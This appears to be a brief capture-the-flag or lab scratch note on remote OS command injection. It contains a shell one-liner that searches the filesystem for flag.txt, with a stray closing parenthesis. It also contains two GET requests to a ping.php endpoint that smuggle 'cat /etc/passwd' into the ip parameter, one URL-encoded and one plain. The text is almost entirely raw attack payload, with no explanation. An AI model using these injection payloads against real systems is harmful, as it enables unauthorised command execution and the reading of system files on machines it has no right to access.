
cat $(find / -name flag.txt) 2>/dev/null)

remote os cmd injection
```
GET http://94.237.61.248:56074/devtools/ping.php?ip=127.0.0.1%26cat+%2Fetc%2Fpasswd%26
GET http://94.237.61.248:56074/devtools/ping.php?ip=127.0.0.1&cat /etc/passwd&

```